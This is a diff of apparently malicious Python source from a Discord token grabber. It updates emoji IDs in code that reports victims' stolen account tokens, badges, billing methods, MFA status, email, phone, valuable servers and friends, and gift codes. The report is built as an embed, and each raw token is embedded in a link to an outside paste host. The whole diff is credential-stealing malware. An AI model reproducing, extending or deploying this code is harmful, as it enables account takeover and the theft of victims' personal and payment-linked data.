@@ -142,62 +142,62 @@ class upload_tokens:
     def calc_flags(self, flags: int) -> list:
         flags_dict = {
             "DISCORD_EMPLOYEE": {
-                "emoji": "<:staff:968704541946167357>",
+                "emoji": "<:Discord_Staff:1073743289066455050>",
                 "shift": 0,
                 "ind": 1
             },
             "DISCORD_PARTNER": {
-                "emoji": "<:partner:968704542021652560>",
+                "emoji": "<:Partnered_Server_Owner:1073743384084226139>",
                 "shift": 1,
                 "ind": 2
             },
             "HYPESQUAD_EVENTS": {
-                "emoji": "<:hypersquad_events:968704541774192693>",
+                "emoji": "<:HypeSquad_Event:1073743462324785242>",
                 "shift": 2,
                 "ind": 4
             },
             "BUG_HUNTER_LEVEL_1": {
-                "emoji": "<:bug_hunter_1:968704541677723648>",
+                "emoji": "<:BugHunter_Green:1073743581438808074>",
                 "shift": 3,
                 "ind": 4
             },
             "HOUSE_BRAVERY": {
-                "emoji": "<:hypersquad_1:968704541501571133>",
+                "emoji": "<:HypeSquad_animated:1073743663156441128>",
                 "shift": 6,
                 "ind": 64
             },
             "HOUSE_BRILLIANCE": {
-                "emoji": "<:hypersquad_2:968704541883261018>",
+                "emoji": "<:HypeSquad_animated:1073743663156441128>",
                 "shift": 7,
                 "ind": 128
             },
             "HOUSE_BALANCE": {
-                "emoji": "<:hypersquad_3:968704541874860082>",
+                "emoji": "<:HypeSquad_animated:1073743663156441128>",
                 "shift": 8,
                 "ind": 256
             },
             "EARLY_SUPPORTER": {
-                "emoji": "<:early_supporter:968704542126510090>",
+                "emoji": "<:Early_Supporter:1073743801761419297>",
                 "shift": 9,
                 "ind": 512
             },
             "BUG_HUNTER_LEVEL_2": {
-                "emoji": "<:bug_hunter_2:968704541774217246>",
+                "emoji": "<:Discord_Gold_Bug_Hunter:1073743895915151452>",
                 "shift": 14,
                 "ind": 16384
             },
             "VERIFIED_BOT_DEVELOPER": {
-                "emoji": "<:verified_dev:968704541702905886>",
+                "emoji": "<:Early_Verified_Bot_Developer:1073743970749927464>",
                 "shift": 17,
                 "ind": 131072
             },
             "ACTIVE_DEVELOPER": {
-                "emoji": "<:Active_Dev:1045024909690163210>",
+                "emoji": "<:ActiveDev_Badge:1073744111502381227>",
                 "shift": 22,
                 "ind": 4194304
             },
             "CERTIFIED_MODERATOR": {
-                "emoji": "<:certified_moderator:988996447938674699>",
+                "emoji": "<:Discord_Mod_Icon:1073744190485303367>",
                 "shift": 18,
                 "ind": 262144
             },
@@ -250,7 +250,7 @@ class upload_tokens:
                         payment_methods.append('💳')
                     
                     elif method['type'] == 2:
-                        payment_methods.append("<:paypal:973417655627288666>")
+                        payment_methods.append("<:Paypal:1073744442965631118>")
 
                     else:
                         payment_methods.append('❓')
@@ -342,29 +342,29 @@ class upload_tokens:
             embed = Embed(title=f"{username} ({user_id})", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
-            embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
-            embed.add_field(name="<:mfa:1021604916537602088> MFA:", value=f"{mfa}", inline=True)
+            embed.add_field(name="<a:Among_Us_Black:1073744941790007306> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+            embed.add_field(name="<a:Evolving_badge_Nitro_a_scaling:1073744626650988554> Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="<a:BadgesRoll:1073745166977998959> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name="<a:Discord_CreditCard:1073745438454329344> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
+            embed.add_field(name="<:SecuritySheild:1073745746039406702> MFA:", value=f"{mfa}", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
             
-            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
-            embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
+            embed.add_field(name="<a:Gmail:1073746191424172112> Email:", value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name="<:IphoneX:1073746271686373428> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if hq_guilds != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
+                embed.add_field(name="<a:Servers:1073747249504473138> HQ Guilds:", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
            
             if hq_friends != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
+                embed.add_field(name="<a:Discord_Invite_People:1073746977432543344> HQ Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if codes != None:
-                embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
+                embed.add_field(name="<a:Discord_Gift:1073747451518910544> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             embed.set_footer(text="@C6 Bank by t*#9009 and soup#2292")
